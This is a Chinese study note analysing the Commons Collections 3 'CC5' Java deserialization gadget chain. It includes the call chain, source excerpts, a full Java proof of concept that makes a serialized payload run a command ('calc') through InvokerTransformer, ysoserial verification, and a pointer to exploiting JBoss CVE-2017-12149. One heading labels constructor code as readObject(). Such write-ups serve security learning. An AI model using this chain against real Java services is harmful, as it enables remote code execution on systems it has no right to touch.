---
title: CC5链分析
description: Commons Collections 3 BadAttributeValueExpException + TiedMapEntry 反序列化链，通过 LazyMap.get() 触发 InvokerTransformer 执行命令
tags: [cc5, commons-collections, deserialization, tiedmapentry, lazymap]
status: 已完成
finish-date: 2026-05-17
difficulty: 困难
---

# CC5链
## 调用链
```
BadAttributeValueExpException.readObject()
    |
    TiedMapEntry.toString()
    |
    TiedMapEntry.getValue()
        |
        LazyMap.get()
        |
        ChainedTransformer.transform()
            |
            ConstantTransformer.transform()
            |
            InvokerTransformer.transform()
``` 
## 调用方法源码
1. BadAttributeValueExpException.readObject()
    ```java
        public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
    ```
2. TiedMapEntry.toString()会调用该类的getValue方法
    ```java
    public String toString() {
        return getKey() + "=" + getValue();
    }
    ```
3. TiedMapEntry.getValue()会调用Map类的get方法
    ```java
    public Object getValue() {
        return map.get(key);
    }
    ```
## 触发条件：
```
1. val字段不为null
2. val字段必须是可序列化对象
3. 该对象的toString方法要有危险行为
    【把 TiedMapEntry 放进 val 字段，它的 toString() 就会触发整个链】 
``` 
## 手工POC
1. 构造关键点：
   1. 为什么要先反射设置val字段的值为null，然后反射设置val值不为null
   2. BadAttributeValueExpException构造方法源码
      ```java
      public BadAttributeValueExpException (Object val) {
            this.val = val == null ? null : val.toString();
         }
      ```
   3. 如果不先设置val值为null那么在构造BadAttributeValueExpException对象时就会触发命令执行
   4. 如果不反射修改值不为null那么在反序列化要真正实现命令执行时就不会触发调用链
2. 完整POC
   ```java
   import java.io.ByteArrayInputStream;
   import java.io.ByteArrayOutputStream;
   import java.lang.reflect.Field;
   import java.util.HashMap;
   import java.util.Map;                       
   import org.apache.commons.collections.Transformer;
   import org.apache.commons.collections.functors.ChainedTransformer;
   import org.apache.commons.collections.functors.ConstantTransformer;
   import org.apache.commons.collections.functors.InvokerTransformer;
   import org.apache.commons.collections.keyvalue.TiedMapEntry;
   import org.apache.commons.collections.map.LazyMap;
   import javax.management.BadAttributeValueExpException;
   import java.io.ObjectOutputStream;
   import java.io.ObjectInputStream;

   public class CC5POC {
      public static void main(String[] args) throws Exception {
         ConstantTransformer ct =new ConstantTransformer(Runtime.class);
         InvokerTransformer i1=new InvokerTransformer("getMethod",
         new Class[]{String.class,Class[].class},
      new Object[]{"getRuntime",new Class[0]});
         InvokerTransformer i2=new InvokerTransformer("invoke",
         new Class[]{Object.class,Object[].class},
         new Object[]{null,new Object[0]});
         InvokerTransformer i3=new InvokerTransformer("exec", 
               new Class[]{String.class},
               new Object[]{"calc"}
         );
         Transformer[] transformers = new Transformer[]{ct,i1,i2,i3};
         ChainedTransformer chain = new ChainedTransformer(transformers);


         HashMap map = new HashMap();
         LazyMap lazyMap=(LazyMap)LazyMap.decorate(map, chain);

         TiedMapEntry entry=new TiedMapEntry(lazyMap, "key");

         BadAttributeValueExpException val=new BadAttributeValueExpException(null);

         Field v=BadAttributeValueExpException.class.getDeclaredField("val");
         v.setAccessible(true);
         v.set(val, entry);


         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         ObjectOutputStream out = new ObjectOutputStream(bos);
         out.writeObject(val);
         out.flush();
         out.close();
         byte[] payload = bos.toByteArray();
         System.out.println("Payload generated successfully!");


         ByteArrayInputStream bis = new ByteArrayInputStream(payload);
         ObjectInputStream ois = new java.io.ObjectInputStream(bis); 
         ois.readObject();
         ois.close();
         System.out.println("Payload deserialized successfully!");
      }
   }
   ```
3. 运行测试![](java-deserialization(ing)/2026-05-17-11-25-06.png) 
## ysoserial验证
1. 生成payload文件![](java-deserialization(ing)/2026-05-17-12-41-47.png)
2. 反序列化验证![](java-deserialization(ing)/2026-05-17-12-45-57.png) 
## CC5 存在的意义：
当 HashMap/HashSet 的 readObject() 被限制或修复时，BadAttributeValueExpException 提供了另一个触发 toString() 的入口  
实战中，JBoss CVE-2017-12149 的利用就推荐使用CC5